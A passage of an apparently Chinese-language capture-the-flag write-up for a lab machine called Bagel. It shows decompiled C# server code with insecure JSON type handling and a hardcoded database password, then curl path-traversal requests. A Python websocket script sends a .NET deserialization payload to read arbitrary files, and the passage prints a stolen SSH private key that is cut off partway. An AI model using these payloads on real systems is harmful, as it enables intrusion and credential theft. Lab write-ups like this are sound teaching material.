class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.CompilerServices;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Versioning;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">using</span> Microsoft.CodeAnalysis;</span><br><span class="line"><span class="keyword">using</span> Microsoft.Data.SqlClient;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> WatsonWebsocket;</span><br><span class="line"></span><br><span class="line">[<span class="meta">assembly: CompilationRelaxations(8)</span>]</span><br><span class="line">[<span class="meta">assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)</span>]</span><br><span class="line">[<span class="meta">assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)</span>]</span><br><span class="line">[<span class="meta">assembly: TargetFramework(<span class="meta-string">&quot;.NETCoreApp,Version=v6.0&quot;</span>, FrameworkDisplayName = <span class="meta-string">&quot;&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyCompany(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyConfiguration(<span class="meta-string">&quot;Debug&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyFileVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyInformationalVersion(<span class="meta-string">&quot;1.0.0&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyProduct(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyTitle(<span class="meta-string">&quot;bagel&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">assembly: AssemblyVersion(<span class="meta-string">&quot;1.0.0.0&quot;</span>)</span>]</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Microsoft.CodeAnalysis</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Embedded</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">EmbeddedAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">System.Runtime.CompilerServices</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Parameter | AttributeTargets.ReturnValue | AttributeTargets.GenericParameter, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span>[] NullableFlags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NullableFlags = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">1</span>] &#123; P_0 &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableAttribute</span>(<span class="params"><span class="built_in">byte</span>[] P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NullableFlags = P_0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">[<span class="meta">CompilerGenerated</span>]</span><br><span class="line">[<span class="meta">Microsoft.CodeAnalysis.Embedded</span>]</span><br><span class="line">[<span class="meta">AttributeUsage(AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Method | AttributeTargets.Interface | AttributeTargets.Delegate, AllowMultiple = false, Inherited = false)</span>]</span><br><span class="line"><span class="keyword">internal</span> <span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title">NullableContextAttribute</span> : <span class="title">Attribute</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">readonly</span> <span class="built_in">byte</span> Flag;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">NullableContextAttribute</span>(<span class="params"><span class="built_in">byte</span> P_0</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Flag = P_0;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">bagel_server</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Handler</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Serialize</span>(<span class="params"><span class="built_in">object</span> obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> JsonConvert.SerializeObject(obj, (Formatting)<span class="number">1</span>, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">Deserialize</span>(<span class="params"><span class="built_in">string</span> json</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0003: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_0015: Expected O, but got Unknown</span></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br><span class="line"><span class="keyword">return</span> JsonConvert.DeserializeObject&lt;Base&gt;(json, val);</span><br><span class="line">&#125;</span><br><span class="line">catch</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;Message\&quot;:\&quot;unknown\&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Bagel</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> _ServerIp = <span class="string">&quot;*&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">int</span> _ServerPort = <span class="number">5000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">bool</span> _Ssl = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> WatsonWsServer _Server = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">InitializeServer();</span><br><span class="line">StartServer();</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">Thread.Sleep(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">InitializeServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0010: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_001a: Expected O, but got Unknown</span></span><br><span class="line">_Server = <span class="keyword">new</span> WatsonWsServer(_ServerIp, _ServerPort, _Ssl);</span><br><span class="line">_Server.set_AcceptInvalidCertificates(<span class="literal">true</span>);</span><br><span class="line">_Server.add_MessageReceived((EventHandler&lt;MessageReceivedEventArgs&gt;)MessageReceived);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">StartServer</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">await</span> _Server.StartAsync(<span class="literal">default</span>(CancellationToken));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">MessageReceived</span>(<span class="params"><span class="built_in">object</span> sender, MessageReceivedEventArgs args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">string</span> json = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (args.get_Data() != <span class="literal">null</span> &amp;&amp; args.get_Data().Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">json = Encoding.UTF8.GetString(args.get_Data().Array, <span class="number">0</span>, args.get_Data().Count);</span><br><span class="line">&#125;</span><br><span class="line">Handler handler = <span class="keyword">new</span> Handler();</span><br><span class="line"><span class="built_in">object</span> obj = handler.Deserialize(json);</span><br><span class="line"><span class="built_in">object</span> obj2 = handler.Serialize(obj);</span><br><span class="line">_Server.SendAsync(args.get_IpPort(), obj2.ToString(), <span class="literal">default</span>(CancellationToken));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Base</span> : <span class="title">Orders</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">int</span> userid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> session = <span class="string">&quot;Unauthorized&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> UserId</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> userid;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">userid = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Session</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> session;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">session = <span class="keyword">value</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> Time =&gt; DateTime.Now.ToString(<span class="string">&quot;h:mm:ss&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Orders</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> order_filename;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> order_info;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> File file = <span class="keyword">new</span> File();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">object</span> RemoveOrder &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> WriteOrder</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file.WriteFile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">order_info = <span class="keyword">value</span>;</span><br><span class="line">file.WriteFile = order_info;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> ReadOrder</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file.ReadFile;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">order_filename = <span class="keyword">value</span>;</span><br><span class="line">order_filename = order_filename.Replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">order_filename = order_filename.Replace(<span class="string">&quot;..&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">file.ReadFile = order_filename;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">File</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> file_content;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> IsSuccess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> directory = <span class="string">&quot;/opt/bagel/orders/&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="built_in">string</span> filename = <span class="string">&quot;orders.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> ReadFile</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> file_content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">filename = <span class="keyword">value</span>;</span><br><span class="line">ReadContent(directory + filename);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">string</span> WriteFile</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">get</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> IsSuccess;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">set</span></span><br><span class="line">&#123;</span><br><span class="line">WriteContent(directory + filename, <span class="keyword">value</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReadContent</span>(<span class="params"><span class="built_in">string</span> path</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">IEnumerable&lt;<span class="built_in">string</span>&gt; values = System.IO.File.ReadLines(path, Encoding.UTF8);</span><br><span class="line">file_content += <span class="built_in">string</span>.Join(<span class="string">&quot;\n&quot;</span>, values);</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception)</span><br><span class="line">&#123;</span><br><span class="line">file_content = <span class="string">&quot;Order not found!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">WriteContent</span>(<span class="params"><span class="built_in">string</span> filename, <span class="built_in">string</span> line</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">System.IO.File.WriteAllText(filename, line);</span><br><span class="line">IsSuccess = <span class="string">&quot;Operation successed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">catch (Exception)</span><br><span class="line">&#123;</span><br><span class="line">IsSuccess = <span class="string">&quot;Operation failed&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DB</span></span><br><span class="line">&#123;</span><br><span class="line">[<span class="meta">Obsolete(<span class="meta-string">&quot;The production team has to decide where the database server will be hosted. This method is not fully implemented.&quot;</span>)</span>]</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DB_connection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//IL_0008: Unknown result type (might be due to invalid IL or missing references)</span></span><br><span class="line"><span class="comment">//IL_000e: Expected O, but got Unknown</span></span><br><span class="line"><span class="built_in">string</span> text = <span class="string">&quot;Data Source=ip;Initial Catalog=Orders;User ID=dev;Password=k8wdAYYKyhnjg3K&quot;</span>;</span><br><span class="line">SqlConnection val = <span class="keyword">new</span> SqlConnection(text);</span><br><span class="line"><span class="built_in">string</span> text2 = <span class="string">&quot;INSERT INTO orders (Name,Address,Count,Type) VALUES (&#x27;Eliot&#x27;,&#x27;Street&#x27;,4,&#x27;Baggel&#x27;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可能有用的凭证<code>developer:k8wdAYYKyhnjg3K</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">developer@10.10.11.201: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span><br></pre></td></tr></table></figure><p>看来不是用来SSH口令登录的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/self/status | cat</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:python3</span><br><span class="line">Umask:0022</span><br><span class="line">State:S (sleeping)</span><br><span class="line">Tgid:893</span><br><span class="line">Ngid:0</span><br><span class="line">Pid:893</span><br><span class="line">PPid:1</span><br><span class="line">TracerPid:0</span><br><span class="line">Uid:1000100010001000</span><br><span class="line">Gid:1000100010001000</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://bagel.htb:8000/?page=../../../../proc/891/status | cat</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Name:dotnet</span><br><span class="line">Umask:0022</span><br><span class="line">State:S (sleeping)</span><br><span class="line">Tgid:891</span><br><span class="line">Ngid:0</span><br><span class="line">Pid:891</span><br><span class="line">PPid:1</span><br><span class="line">TracerPid:0</span><br><span class="line">Uid:1001100110011001</span><br><span class="line">Gid:1001100110011001</span><br></pre></td></tr></table></figure><p>8000端口的WEB服务所有者为用户developer，5000端口的WS服务所有者为用户phil</p><blockquote><p><a href="https://www.cnblogs.com/nice0e3/p/15294585.html">https://www.cnblogs.com/nice0e3/p/15294585.html</a><br /><a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15</a></p></blockquote><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JsonSerializerSettings val = <span class="keyword">new</span> JsonSerializerSettings();</span><br><span class="line">val.set_TypeNameHandling((TypeNameHandling)<span class="number">4</span>);</span><br></pre></td></tr></table></figure><p>反序列化设置<code>TypeNameHandling</code>为，即auto，所以我们可以利用对象<code>RemoveOrder</code>利用反序列化在处理<code>typeName</code>时的漏洞</p><p>编写<code>ws.py</code>如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ws.py</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.WebSocket()    </span><br><span class="line">ws.connect(<span class="string">&quot;ws://10.10.11.201:5000/&quot;</span>) <span class="comment"># connect to order app</span></span><br><span class="line">order = &#123;<span class="string">&quot;RemoveOrder&quot;</span>: &#123;<span class="string">&quot;$type&quot;</span>: <span class="string">&quot;bagel_server.File, bagel&quot;</span>, <span class="string">&quot;ReadFile&quot;</span>:<span class="string">&quot;../../..%s&quot;</span> % sys.argv[<span class="number">1</span>]&#125;&#125;</span><br><span class="line">data = <span class="built_in">str</span>(json.dumps(order))</span><br><span class="line">ws.send(data)</span><br><span class="line">result = ws.recv()</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p><code>$type</code>的值为程序集限定名，即调用<code>bagel</code>(程序集名称，貌似可以粗略理解为dll的文件名)中命名空间<code>bagel_server</code>的<code>File</code>类<br />然后调用函数<code>ReadFile</code>并进行赋值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ws.py /home/phil/.ssh/id_rsa</span><br></pre></td></tr></table></figure><p>得到SSH私钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAuhIcD7KiWMN8eMlmhdKLDclnn0bXShuMjBYpL5qdhw8m1Re3Ud+2\ns8SIkkk0KmIYED3c7aSC8C74FmvSDxTtNOd3T/iePRZOBf5CW3gZapHh+mNOrSZk13F28N\ndZiev5vBubKayIfcG8QpkIPbfqwXhKR+qCsfqS//bAMtyHkNn3n9cg7ZrhufiYCkg9jBjO\nZL4+rw4UyWsONsTdvil6tlc41PXyETJat6dTHSHTKz+S7lL4wR/I+saVvj8KgoYtDCE1sV\nVftUZhkFImSL2ApxIv7tYmeJbombYff1SqjHAkdX9VKA0gM0zS7but3/klYq6g3l+NEZOC\nM0/I+30oaBoXCjvupMswiY/oV9UF7HNruDdo06hEu0ymAoGninXaph+ozjdY17PxNtqFfT\neYBgBoiRW7hnY3cZpv3dLqzQiEqHlsnx2ha/A8UhvLqYA6PfruLEMxJVoDpmvvn9yFWxU1\nYvkqYaIdirOtX/h25gvfTNvlzxuwNczjS7gGP4XDAAAFgA50jZ4OdI2eAAAAB3NzaC1yc2\nEAAAGBALoSHA+yoljDfHjJZoXSiw3JZ59G10objIwWKS+anYcPJtUXt1HftrPEiJJJNCpi\nGBA93O2kgvAu+BZr0g8U7TTnd0/4nj0WTgX+Qlt4GWqR4fpjTq0mZNdxdvDXWYnr+bwbmy\nmsiH3BvEKZCD236sF4SkfqgrH6kv/2wDLch5DZ95/XIO2a4bn4mApIPYwYzmS+Pq8OFMlr\nDjbE3b4perZXONT18hEyWrenUx0h0ys/ku5S+MEfyPrGlb4/CoKGLQwhNbFVX7VGYZBSJk\ni9gKcSL+7WJniW6Jm2H39UqoxwJHV/VSgNIDNM0u27rd/5JWKuoN5fjRGTgjNPyPt9KGga\nFwo77qTLMImP6FfVBexza7g3aNOoRLtMpgKBp4p12qYfqM43WNez8TbahX03mAYAaIkVu4\nZ2N3Gab93S6s0IhKh5bJ8doWvwPFIby6mAOj367ixDMSVaA6Zr75/chVsVNWL5KmGiHYqz\nrV/4duYL30zb5c8bsDXM40u4Bj+FwwAAAAMBAAEAAAGABzEAtDbmTvinykHgKgKfg6OuUx\nU+DL5C1WuA/QAWuz44maOmOmCjdZA1M+vmzbzU+NRMZtYJhlsNzAQLN2dKuIw56+xnnBrx\nzFMSTw5IBcPoEFWxzvaqs4OFD/QGM0CBDKY1WYLpXGyfXv/ZkXmpLLbsHAgpD2ZV6ovwy9\n1L971xdGaLx3e3VBtb5q3VXyFs4UF4N71kXmuoBzG6OImluf+vI/tgCXv38uXhcK66odgQ\nPn6CTk0VsD5oLVUYjfZ0ipmfIb1rCXL410V7H1DNeUJeg4hFjzxQnRUiWb2Wmwjx5efeOR\nO1eDvHML3/X4WivARfd7XMZZyfB3JNJbynVRZPr/DEJ/owKRDSjbzem81TiO4Zh06OiiqS\n+itCwDdFq4RvAF+YlK9Mmit3/QbMVTsL7GodRAvRzsf1dFB+Ot+tNMU73Uy1hzIi06J57P\nWRATokDV/Ta7gYeuGJfjdb5cu61oTKbXdUV9WtyBhk1IjJ9l0Bit/mQyTRmJ5KH+CtAAAA\nwFpnmvzlvR+gubfmAhybWapfAn5+3yTDjcLSMdYmTcjoBOgC4lsgGYGd7GsuIMgowwrGDJ\nvE1yAS1vCest9D51grY4uLtj